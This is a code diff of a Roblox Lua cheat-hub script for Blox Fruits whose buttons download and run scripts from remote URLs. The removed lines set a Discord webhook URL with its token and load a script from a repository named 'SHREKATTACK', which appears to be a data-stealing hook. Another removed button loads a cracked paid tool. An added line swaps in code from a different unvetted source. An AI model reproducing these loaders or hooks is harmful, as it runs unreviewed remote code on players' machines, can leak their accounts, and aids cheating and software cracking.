@@ -1,15 +1,10 @@
-   _G.webhooksdiscord = "https://discord.com/api/webhooks/954215470578413620/yZeVHq4lS-rRMF9RE4SqIuytPaRdp4xBuq9EUxnzMvUESSVXzerMJiMr7020066eD7eM"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
 local Abstract = loadstring(game:HttpGet("https://raw.githubusercontent.com/AbstractPoo/Main/AbstractUI/AbstractUI"))()
 local UI = Abstract:Create("ZTIMESHOP | Universal Ui", UDim2.new(0, 420, 0, 450))
 
 UI:Divider("Blox Fruit")
 
-UI:Button("Xenon-Paid", "PC - Cr.Xenon", function()
-    loadstring(game:HttpGet('https://androssy.net/files/Loader.lua')){46850,36528,18832,98081,87202,65683}
-end)
 UI:Button("Ren Hub Creck", "PC - Cr.Xenon", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/jojo382/RenHub-Creck/main/Ren_Hub.txt")()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SHAREHACK/bloxfruit/main/free")()
 end)
 UI:Button("HulkUHUB-Free", "PC - Cr.HULKUexe", function()
     loadstring(game:HttpGet"https://raw.githubusercontent.com/HULKUexe/XDevilScript/main/HULKUHUB")()
